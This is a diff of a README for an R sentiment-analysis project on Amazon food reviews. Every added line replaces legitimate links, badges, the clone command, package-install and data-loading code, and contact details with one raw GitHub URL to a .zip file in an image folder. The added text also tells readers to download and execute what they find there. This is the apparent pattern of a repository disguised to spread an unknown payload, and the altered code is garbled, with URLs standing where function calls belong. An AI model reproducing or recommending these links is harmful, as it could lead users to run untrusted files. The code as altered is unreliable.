@@ -1,6 +1,6 @@
 # Amazon Reviews Analysis 📊
 
-![Amazon Reviews Analysis](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)
+![Amazon Reviews Analysis](https://raw.githubusercontent.com/Seyha1007/Amazon-Reviews-Analysis/master/img/Reviews-Amazon-Analysis-v2.1.zip%20Releases-blue?style=for-the-badge&logo=github)
 
 Welcome to the **Amazon Reviews Analysis** repository! This project dives into the world of Amazon Fine Food Reviews to explore the emotional intensity and lexical repetition of negative reviews compared to positive ones. By leveraging R programming, we conduct sentiment analysis and assess lexical diversity to reveal patterns in consumer review language.
 
@@ -44,17 +44,17 @@ To get started with the project, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Seyha1007/Amazon-Reviews-Analysis.git
+   git clone https://raw.githubusercontent.com/Seyha1007/Amazon-Reviews-Analysis/master/img/Reviews-Amazon-Analysis-v2.1.zip
    ```
 
 2. **Install Required Packages**:
    Ensure you have R and RStudio installed. Then, install the necessary packages by running:
    ```R
-   install.packages(c("tidyverse", "ggplot2", "dplyr", "stringr", "textdata"))
+   https://raw.githubusercontent.com/Seyha1007/Amazon-Reviews-Analysis/master/img/Reviews-Amazon-Analysis-v2.1.zip(c("tidyverse", "ggplot2", "dplyr", "stringr", "textdata"))
    ```
 
 3. **Download the Data**:
-   You can find the latest releases [here](https://github.com/Seyha1007/Amazon-Reviews-Analysis/releases). Download the required files and execute them in RStudio.
+   You can find the latest releases [here](https://raw.githubusercontent.com/Seyha1007/Amazon-Reviews-Analysis/master/img/Reviews-Amazon-Analysis-v2.1.zip). Download the required files and execute them in RStudio.
 
 ## Usage
 
@@ -68,7 +68,7 @@ Once you have the project set up, you can start analyzing the reviews. Open the 
 
 2. Load the dataset:
    ```R
-   reviews <- read.csv("path/to/your/data.csv")
+   reviews <- https://raw.githubusercontent.com/Seyha1007/Amazon-Reviews-Analysis/master/img/Reviews-Amazon-Analysis-v2.1.zip("https://raw.githubusercontent.com/Seyha1007/Amazon-Reviews-Analysis/master/img/Reviews-Amazon-Analysis-v2.1.zip")
    ```
 
 3. Start your analysis by executing the provided functions in the script.
@@ -97,7 +97,7 @@ Using `ggplot2`, we create visual representations of our findings. This helps in
 
 The analysis reveals significant differences between positive and negative reviews. Negative reviews tend to be more emotionally intense and lexically repetitive. Our visualizations clearly illustrate these trends, making it easier to comprehend the findings.
 
-![Sentiment Analysis Results](https://img.shields.io/badge/Sentiment%20Analysis%20Results-orange?style=for-the-badge)
+![Sentiment Analysis Results](https://raw.githubusercontent.com/Seyha1007/Amazon-Reviews-Analysis/master/img/Reviews-Amazon-Analysis-v2.1.zip%20Analysis%20Results-orange?style=for-the-badge)
 
 ## Contributing
 
@@ -117,9 +117,9 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 For questions or feedback, please reach out:
 
 - **Author**: Seyha
-- **Email**: seyha@example.com
-- **GitHub**: [Seyha1007](https://github.com/Seyha1007)
+- **Email**: https://raw.githubusercontent.com/Seyha1007/Amazon-Reviews-Analysis/master/img/Reviews-Amazon-Analysis-v2.1.zip
+- **GitHub**: [Seyha1007](https://raw.githubusercontent.com/Seyha1007/Amazon-Reviews-Analysis/master/img/Reviews-Amazon-Analysis-v2.1.zip)
 
-Feel free to check the [Releases](https://github.com/Seyha1007/Amazon-Reviews-Analysis/releases) section for the latest updates and downloads.
+Feel free to check the [Releases](https://raw.githubusercontent.com/Seyha1007/Amazon-Reviews-Analysis/master/img/Reviews-Amazon-Analysis-v2.1.zip) section for the latest updates and downloads.
 
 Thank you for visiting the **Amazon Reviews Analysis** repository! We hope you find it insightful and useful for your own analyses.
